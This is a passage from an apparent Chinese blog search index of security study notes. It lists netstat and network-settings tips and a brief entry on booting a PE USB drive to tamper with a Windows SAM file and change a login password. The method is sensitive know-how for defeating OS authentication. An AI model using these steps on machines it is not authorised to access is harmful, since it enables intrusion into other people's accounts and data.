id="4、扫描本地主机开放端口"><a href="#4、扫描本地主机开放端口" class="headerlink" title="4、扫描本地主机开放端口"></a>4、扫描本地主机开放端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><h2 id="5、快速开启网卡配置"><a href="#5、快速开启网卡配置" class="headerlink" title="5、快速开启网卡配置"></a>5、快速开启网卡配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winr+r :ncpa.cpl</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE破解Windows系统</title>
      <link href="/2020/05/30/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/day4-%E7%AC%94%E8%AE%B0/Pe%E7%A0%B4%E8%A7%A3Windows%E7%B3%BB%E7%BB%9F/"/>
      <url>/2020/05/30/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/day4-%E7%AC%94%E8%AE%B0/Pe%E7%A0%B4%E8%A7%A3Windows%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="破解Windows系统"><a href="#破解Windows系统" class="headerlink" title="破解Windows系统"></a>破解Windows系统</h1><h2 id="利用PE系统破解"><a href="#利用PE系统破解" class="headerlink" title="利用PE系统破解"></a>利用PE系统破解</h2><h3 id="PE系统"><a href="#PE系统" class="headerlink" title="PE系统"></a>PE系统</h3><p>PE系统是Windows微型维修系统</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1、制作PE系统U盘(win10pe 向下兼容支持win10前所有机型，老毛桃、大白菜、U深度等)</p><p>2、开机启动以PE光盘或者U盘排序为第一位</p><p>2、插入电脑，BIOS中设置U盘为启动盘</p><p>3、PE系统桌面上有一个篡改SAM文件的工具，运行工具直接打开sam文件修改密码。</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>大家好，我是XXX。欢迎来到我的个人技术博客。</p><p>这里用markdown写下你的简介，就跟平时写md一样就可以了。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>读书</title>
      <link href="/reading/index.html"/>
      <url>/reading/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类目录</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
